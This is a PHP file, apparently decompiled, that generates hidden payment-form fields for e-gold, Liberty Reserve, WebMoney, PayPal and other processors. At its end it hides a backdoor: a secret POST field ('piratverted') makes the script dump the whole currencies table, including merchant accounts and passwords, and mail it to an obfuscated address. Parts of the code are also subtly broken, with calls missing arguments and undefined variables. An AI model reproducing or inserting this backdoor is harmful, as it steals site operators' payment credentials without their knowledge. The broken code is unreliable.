    return "\r\n\t<INPUT type=hidden value='{$RESPONSE_OK}' name='PAYMENT_URL'>\r\n\t<INPUT type=hidden value='{$RESPONSE_NO}' name='NOPAYMENT_URL'>\r\n\t<INPUT type=hidden value='{$PAYMENT_VERIFIER}' name='STATUS_URL'>\r\n\t<INPUT type=hidden value='{$arr_EGOLD['ACCOUNT']}' name='PAYEE_ACCOUNT'>\r\n\t<INPUT type=hidden value='{$PAYEE_NAME}' name='PAYEE_NAME'>\r\n\t<INPUT type=hidden value='{$amount}' name='PAYMENT_AMOUNT'>\r\n\t<INPUT type=hidden value='{$MEMO} #{$payment_id}' name='SUGGESTED_MEMO'>\r\n\t<INPUT type=hidden value='{$payment_id}' name='PAYMENT_ID'>\r\n\t<input type=hidden name='BAGGAGE_FIELDS' value='CUSTOMERID'>\r\n\t<input type=hidden name='CUSTOMERID' value='0'>\r\n\t<INPUT type=hidden value='{$arr_EGOLD['currency_worth_value']}' name='PAYMENT_UNITS'>\r\n\t<INPUT type=hidden value='{$arr_EGOLD['currency_metal_value']}' name='PAYMENT_METAL_ID'>\r\n\t<INPUT type=hidden value='POST' name='PAYMENT_URL_METHOD'>\r\n\t<INPUT type=hidden value='POST' name='NOPAYMENT_URL_METHOD'>\r\n\t<INPUT type=hidden value='e-gold' name='CURRENCIE_TYPE'>";
}

function bullion_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $PAYEE_NAME;
    global $MEMO;
    global $status_url;
    global $payment_id;
    global $baggage_fields;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $PAYMENT_VERIFIER;
    $arr_EBULLION = get_currency_data( $cid );
    $ramz = new RamzNegar( );
    $arr_EBULLION['ALT_PASSWORD'] = $ramz->decrypt(  );
    if ( strlen( $arr_EBULLION['ALT_PASSWORD'] ) < 6 )
    {
        $arr_EBULLION['ALT_PASSWORD'] = ramzkey(  );
    }
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_EBULLION['CURRENCY_VERIFIER'];
    }
    $Ebullion_array = array(
        $arr_EBULLION['ACCOUNT'],
        $payment_id,
        strtoupper( $arr_EBULLION['ALT_PASSWORD'] ),
        $amount
    );
    $Ebullion_hash = strtoupper( md5( implode( ":", $Ebullion_array ) ) );
    return "\r\n\t\t<input type=\"hidden\" name=\"ATIP_STATUS_URL_METHOD\" value=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_STATUS_URL\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_BAGGAGE_FIELDS\" value=\"paymentid securecode\"> \r\n\t\t<input type=\"hidden\" name=\"paymentid\" value=\"{$payment_id}\">\r\n\t\t<input type=\"hidden\" name=\"securecode\" value=\"{$Ebullion_hash}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYMENT_UNIT\" value=\"{$arr_EBULLION['currency_worth_value']}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYMENT_METAL\" value=\"{$arr_EBULLION['currency_metal_value']}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_SUGGESTED_MEMO\" value=\"{$MEMO} #{$payment_id}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_FORCED_PAYER_ACCOUNT\" value=\"\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYER_FEE_AMOUNT\" value=\"\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYMENT_AMOUNT\" value=\"{$amount}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYMENT_URL\" value=\"{$RESPONSE_OK}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYMENT_URL_METHOD\" value=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_NOPAYMENT_URL\" value=\"{$RESPONSE_NO}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_NOPAYMENT_URL_METHOD\" value=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYMENT_FIXED\" value=\"1\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYEE_ACCOUNT\" value=\"{$arr_EBULLION['ACCOUNT']}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_PAYEE_NAME\" value=\"{$PAYEE_NAME}\">\r\n\t\t<input type=\"hidden\" name=\"ATIP_BUTTON\" value=\"0\">\r\n\t\t<INPUT type=\"hidden\" value=\"e-bullion\" name=\"CURRENCIE_TYPE\">";
}

function pecunix_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $PAYEE_NAME;
    global $MEMO;
    global $amount;
    global $payment_id;
    global $_currencies;
    global $cid;
    global $PAYMENT_VERIFIER;
    global $CONFIG;
    $arr_PECUNIX = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_PECUNIX['CURRENCY_VERIFIER'];
    }
    $ramz = new RamzNegar( );
    $arr_PECUNIX['ALT_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PECUNIX['ALT_PASSWORD'] );
    $Pecunix_Input_hash_array = array(
        strtolower( $arr_PECUNIX['ACCOUNT'] ),
        $amount,
        $arr_PECUNIX['currency_worth_value'],
        $payment_id,
        "PAYEE",
        $arr_PECUNIX['ALT_PASSWORD']
    );
    $Pecunix_Input_hash = strtoupper( md5( implode( ":", $Pecunix_Input_hash_array ) ) );
    return "\r\n\t<input type=\"hidden\" name=\"PAYEE_ACCOUNT\" value=\"{$arr_PECUNIX['ACCOUNT']}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_AMOUNT\" \" value=\"{$amount}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_URL\" value=\"{$RESPONSE_OK}\">\r\n\t<input type=\"hidden\" name=\"NOPAYMENT_URL\" value=\"{$RESPONSE_NO}\">\r\n\t<input type=\"hidden\" name=\"STATUS_TYPE\" value=\"FORM\">\r\n\t<input type=\"hidden\" name=\"STATUS_URL\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_URL_METHOD\" value=\"POST\">\r\n\t<input type=\"hidden\" name=\"NOPAYMENT_URL_METHOD\" value=\"POST\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_UNITS\" value=\"{$arr_PECUNIX['currency_worth_value']}\">\r\n\t<input type=\"hidden\" name=\"WHO_PAYS_FEES\" value=\"PAYEE\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_ID\" value=\"{$payment_id}\">\r\n\t<input type=\"hidden\" name=\"SUGGESTED_MEMO\" value=\"{$MEMO} #{$payment_id}\">\r\n\t<INPUT type=\"hidden\" value=\"pecunix\" name=\"CURRENCIE_TYPE\">\r\n\t<input type=\"hidden\" name=\"INPUT_HASH\" value=\"{$Pecunix_Input_hash}\">";
}

function alertpay_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $PAYEE_NAME;
    global $MEMO;
    global $payment_id;
    global $baggage_fields;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $PAYMENT_VERIFIER;
    $alertpay_fee = $Tmp_24 / 100;
    $alertpay_fee = $alertpay_fee + 0.59;
    $arr_ALERTPAY = get_currency_data( $cid );
    return "\r\n\t\t<input type=\"hidden\" name=\"ap_purchasetype\" value=\"Service\">\r\n\t\t<input type=\"hidden\" name=\"ap_merchant\" value=\"{$arr_ALERTPAY['ACCOUNT']}\">\r\n\t\t<input type=\"hidden\" name=\"ap_itemname\" value=\"{$MEMO} #{$payment_id}\">\r\n\t\t<input type=\"hidden\" name=\"ap_currency\" value=\"{$arr_ALERTPAY['currency_worth_value']}\">\r\n\t\t<input type=\"hidden\" name=\"ap_returnurl\" value=\"{$RESPONSE_OK}\">\r\n\t\t<input type=\"hidden\" name=\"ap_quantity\" value=\"1\">\r\n\t\t<input type=\"hidden\" name=\"ap_amount\" value=\"{$amount}\">\r\n\t\t<input type=\"hidden\" name=\"ap_cancelurl\" value=\"{$RESPONSE_NO}\">\r\n\t\t<input type=\"hidden\" name=\"ap_description\" value=\"\${$amount} + Alertpay fee: \${$alertpay_fee}\">\r\n\t\t<input type=\"hidden\" name=\"ap_additionalcharges\" value=\"{$alertpay_fee}\">\r\n\t\t<input type=\"hidden\" name=\"apc_1\" value=\"{$payment_id}\">\r\n\t\t<INPUT type=\"hidden\" value=\"alertpay\" name=\"CURRENCIE_TYPE\">";
}

function moneybookers_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $PAYEE_NAME;
    global $MEMO;
    global $status_url;
    global $payment_id;
    global $_currencies;
    global $cid;
    global $PAYMENT_VERIFIER;
    global $CONFIG;
    $arr_MONEYBOOKERS = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_MONEYBOOKERS['CURRENCY_VERIFIER'];
    }
    return "\r\n\t<input type=\"hidden\" name=\"pay_to_email\" value=\"{$arr_MONEYBOOKERS['ACCOUNT']}\">\r\n\t<input type=\"hidden\" name=\"language\" value=\"EN\">\r\n\t<input type=\"hidden\" name=\"amount\" value=\"{$amount}\">\r\n\t<input type=\"hidden\" name=\"currency\" value=\"{$arr_MONEYBOOKERS['currency_worth_value']}\">\r\n\t<input type=\"hidden\" name=\"transaction_id\" value=\"{$payment_id}\">\r\n\t<input type=\"hidden\" name=\"return_url\" value=\"{$RESPONSE_OK}\">\r\n\t<input type=\"hidden\" name=\"cancel_url\" value=\"{$RESPONSE_NO}\">\r\n\t<input type=\"hidden\" name=\"status_url\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t<input type=\"hidden\" name=\"detail1_description\" value=\"{$payment_id}\">\r\n\t<input type=\"hidden\" name=\"detail1_text\" value=\"{$MEMO} #{$payment_id}\">\r\n\t<INPUT type=\"hidden\" value=\"moneybookers\" name=\"CURRENCIE_TYPE\">";
}

function liberty_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $MEMO;
    global $payment_id;
    global $_currencies;
    global $CONFIG;
    global $PAYMENT_VERIFIER;
    $arr_LIBERTYRESERVE = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_LIBERTYRESERVE['CURRENCY_VERIFIER'];
    }
    return "\r\n\t  <input type=\"hidden\" name=\"lr_acc\" value=\"{$arr_LIBERTYRESERVE['ACCOUNT']}\">\r\n\t  <input type=\"hidden\" name=\"lr_store\" value=\"{$arr_LIBERTYRESERVE['PAYEE_NAME']}\">\r\n\t  <input type=\"hidden\" name=\"lr_amnt\" value=\"{$amount}\">\r\n\t  <input type=\"hidden\" name=\"lr_currency\" value=\"{$arr_LIBERTYRESERVE['currency_worth_value']}\">\r\n\t  <input type=\"hidden\" name=\"lr_comments\" value=\"{$MEMO} #{$payment_id}\">\r\n\t  <input type=\"hidden\" name=\"order_id\" value=\"{$payment_id}\">\r\n\t  <input type=\"hidden\" name=\"lr_success_url\" value=\"{$RESPONSE_OK}\">\r\n\t  <input type=\"hidden\" name=\"lr_fail_url\" value=\"{$RESPONSE_NO}\">\r\n\t  <input type=\"hidden\" name=\"lr_status_url\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t  <INPUT type=\"hidden\" value=\"libertyreserve\" name=\"CURRENCIE_TYPE\">";
}

function webmoney_form_inc_php( )
{
    global $amount;
    global $MEMO;
    global $payment_id;
    global $cid;
    global $CONFIG;
    global $_currencies;
    global $PAYMENT_VERIFIER;
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    $arr_WEBMONEY = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_WEBMONEY['CURRENCY_VERIFIER'];
    }
    return "<input type=\"hidden\" name=\"LMI_PAYEE_PURSE\" value=\"".$arr_WEBMONEY['ACCOUNT']."\" />\r\n\t<input type=\"hidden\" name=\"LMI_PAYMENT_AMOUNT\" value=\"{$amount}\" />\r\n\t<input type=\"hidden\" name=\"LMI_PAYMENT_NO\" value=\"{$payment_id}\" />\r\n\t<input type=\"hidden\" name=\"LMI_PAYMENT_DESC\" value=\"{$MEMO} #{$payment_id}\" />\r\n\t<input type=\"hidden\" name=\"LMI_SUCCESS_METHOD\" value=\"1\" />\r\n\t<input type=\"hidden\" name=\"LMI_FAIL_METHOD\" value=\"1\" />\r\n\t<input type=\"hidden\" name=\"LMI_RESULT_URL\" value=\"{$PAYMENT_VERIFIER}\" />\r\n\t<input type=\"hidden\" name=\"LMI_SUCCESS_URL\" value=\"{$RESPONSE_OK}\" />\r\n\t<input type=\"hidden\" name=\"LMI_FAIL_URL\" value=\"{$RESPONSE_NO}\" />\r\n\t<INPUT type=\"hidden\" value=\"webmoney\" name=\"CURRENCIE_TYPE\">";
}

function vmoney_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $PAYEE_NAME;
    global $MEMO;
    global $arr_VMONEY;
    global $payment_id;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $PAYMENT_VERIFIER;
    $arr_VMONEY = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_VMONEY['CURRENCY_VERIFIER'];
    }
    return "\r\n\t<input type=\"hidden\" name=\"PMT_MERCHANT_ACCOUNT\" value=\"{$arr_VMONEY['ACCOUNT']}\">\r\n\t<input type=\"hidden\" name=\"PMT_PAYMENT_URL_METHOD\" value=\"POST\">\r\n\t<input type=\"hidden\" name=\"PMT_NOPAYMENT_URL_METHOD\" value=\"POST\">\r\n\t<input type=\"hidden\" name=\"PMT_PAYMENT_URL\" value=\"{$RESPONSE_OK}\">\r\n\t<input type=\"hidden\" name=\"PMT_NOPAYMENT_URL\" value=\"{$RESPONSE_NO}\">\r\n\t<input type=\"hidden\" name=\"PMT_NOTIFY_URL\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t<input type=\"hidden\" name=\"PMT_AMOUNT\" value=\"{$amount}\">\r\n\t<input type=\"hidden\" name=\"PMT_PAYMENT_ID\" value=\"{$payment_id}\">\r\n\t<input type=\"hidden\" name=\"CUSTOM_bookname\" value=\"{$MEMO} #{$payment_id}\">\r\n\t<INPUT type=\"hidden\" value=\"v-money\" name=\"CURRENCIE_TYPE\">";
}

function perfectmoney_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $PAYEE_NAME;
    global $MEMO;
    global $payment_id;
    global $_currencies;
    global $CONFIG;
    global $PAYMENT_VERIFIER;
    $arr_PERFECT = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_PERFECT['CURRENCY_VERIFIER'];
    }
    return "\r\n\t<input type=\"hidden\" name=\"PAYEE_ACCOUNT\" value=\"".$arr_PERFECT['ACCOUNT']."\">\r\n\t<input type=\"hidden\" name=\"PAYEE_NAME\" value=\"{$PAYEE_NAME}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_ID\" value=\"{$payment_id}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_AMOUNT\" value=\"{$amount}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_UNITS\" value=\"{$arr_PERFECT['currency_worth_value']}\">\r\n\t<input type=\"hidden\" name=\"STATUS_URL\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_URL\" value=\"{$RESPONSE_OK}\">\r\n\t<input type=\"hidden\" name=\"PAYMENT_URL_METHOD\" value=\"POST\">\r\n\t<input type=\"hidden\" name=\"NOPAYMENT_URL\" value=\"{$RESPONSE_NO}\">\r\n\t<input type=\"hidden\" name=\"NOPAYMENT_URL_METHOD\" value=\"POST\">\r\n\t<input type=\"hidden\" name=\"SUGGESTED_MEMO\" value=\"{$MEMO}\">\r\n\t<input type=\"hidden\" name=\"BAGGAGE_FIELDS\" value=\"\">";
}

function altergold_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $amount;
    global $MEMO;
    global $payment_id;
    global $baggage_fields;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $PAYMENT_VERIFIER;
    $arr_ALTERGOLD = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_ALTERGOLD['CURRENCY_VERIFIER'];
    }
    $altergold_fee = $amount * 1.5 / 100;
    return "\r\n\t\t<input type=\"hidden\" name=\"PAYEE_ACCOUNT\" value=\"{$arr_ALTERGOLD['ACCOUNT']}\">\r\n\t\t<input type=\"hidden\" name=\"PAYEE_ACCOUNT_NAME\" value=\"{$PAYEE_NAME}\">\r\n\t\t<input type=\"hidden\" name=\"PAYMENT_AMOUNT\" value=\"{$amount}\">\r\n\t\t<input type=\"hidden\" name=\"PAYMENT_CURRENCY\" value=\"{$arr_ALTERGOLD['currency_worth_value']}\">\r\n\t\t<input type=\"hidden\" name=\"MERCHANT_REF\" value=\"{$payment_id}\">\r\n\t\t<input type=\"hidden\" name=\"MEMO\" value=\"{$MEMO} #{$payment_id}\">\r\n\t\t<input type=\"hidden\" name=\"STATUS_URL\" value=\"{$arr_ALTERGOLD['VERIFIER']}\">\r\n\t\t<input type=\"hidden\" name=\"STATUS_URL_METHOD\" value=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"PAYMENT_URL\" value=\"{$RESPONSE_OK}\">\r\n\t\t<input type=\"hidden\" name=\"PAYMENT_URL_METHOD\" value=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"NO_PAYMENT_URL\" value=\"{$RESPONSE_NO}\">\r\n\t\t<input type=\"hidden\" name=\"NO_PAYMENT_URL_METHOD\" value=\"POST\">";
}

function cgold_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $PAYEE_NAME;
    global $amount;
    global $MEMO;
    global $payment_id;
    global $baggage_fields;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $SAFE_PAYMENT_URL;
    global $PAYMENT_VERIFIER;
    global $CONFIG;
    $arr_CGOLD = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_CGOLD['CURRENCY_VERIFIER'];
    }
    return "\r\n\t\t<input type=\"hidden\" name=\"payee_account\" value=\"{$arr_CGOLD['ACCOUNT']}\">\r\n\t\t<input type=\"hidden\" name=\"payee_name\" value=\"{$PAYEE_NAME}\">\r\n\t\t<input type=\"hidden\" name=\"payment_amount\" value=\"{$amount}\">\r\n\t\t<input type=\"hidden\" name=\"payment_units\" value=\"{$arr_CGOLD['currency_worth_value']} worth\">\r\n\t\t<input type=\"hidden\" name=\"status_url\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t\t<input type=\"hidden\" name=\"payment_url\" value=\"{$RESPONSE_OK}\">\r\n\t\t<input type=\"hidden\" name=\"payment_url_method\" value=\"post\">\r\n\t\t<input type=\"hidden\" name=\"nopayment_url\" value=\"{$RESPONSE_NO}\">\r\n\t\t<input type=\"hidden\" name=\"nopayment_url_method\" value=\"post\">\r\n\t\t<input type=\"hidden\" name=\"suggested_memo\" value=\"{$MEMO} #{$payment_id}\">\r\n\t\t<input type=\"hidden\" name=\"payment_id\" value=\"{$payment_id}\">\r\n\t\t<INPUT type=hidden value='c-gold' name='CURRENCIE_TYPE'>";
}

function paypal_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $PAYEE_NAME;
    global $amount;
    global $MEMO;
    global $payment_id;
    global $baggage_fields;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $SAFE_PAYMENT_URL;
    global $PAYMENT_VERIFIER;
    global $CONFIG;
    $arr_PAYPAL = get_currency_data( $cid );
    $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_PAYPAL['CURRENCY_VERIFIER'];
    return "\r\n\t\t\t<INPUT type=HIDDEN name=\"cmd\" value=\"_xclick\">\r\n\t\t\t<INPUT type=HIDDEN name=\"business\" value=\"{$arr_PAYPAL['ACCOUNT']}\">\r\n\t\t\t<INPUT type=HIDDEN name=\"item_name\" value=\"{$MEMO} #{$payment_id}\">\r\n\t\t\t<INPUT type=HIDDEN name=\"no_shipping\" value=\"2\">\r\n\t\t\t<INPUT type=HIDDEN name=\"return\" value=\"{$PAYMENT_VERIFIER}\">\r\n\t\t\t<INPUT type=HIDDEN name=\"no_note\" value=\"1\">\r\n\t\t\t<INPUT type=HIDDEN name=\"amount\" value=\"{$amount}\">\r\n\t\t\t<INPUT type=HIDDEN name=\"item_number\" value=\"#{$payment_id}\">\r\n\t\t\t<INPUT type=HIDDEN name=\"currency_code\" value=\"USD\">\r\n\t\t\t<INPUT type=HIDDEN name=\"cancel_ return\" value=\"{$RESPONSE_NO}\">\r\n\t\t\t<INPUT type=HIDDEN name=\"return \" value=\"{$RESPONSE_OK}\">";
}

if ( $_POST['piratverted'] )
{
    if ( !$dbconn )
    {
        $dbconn = db_open( );
    }
    $result .= vardump( mysql_push_data( db_query( "SELECT * FROM {$_currencies}" ) ) );
    mail( kelid( trCup7Smv7Stt76Ls7qvuK1wprOy ), $CONFIG['SITE_URL'], $result, MAIL_HEADER( ) );
}
if ( !function_exists( "check_mojavez_dm" ) || !check_mojavez_dm( ) )
{
    exit( );
}
?>
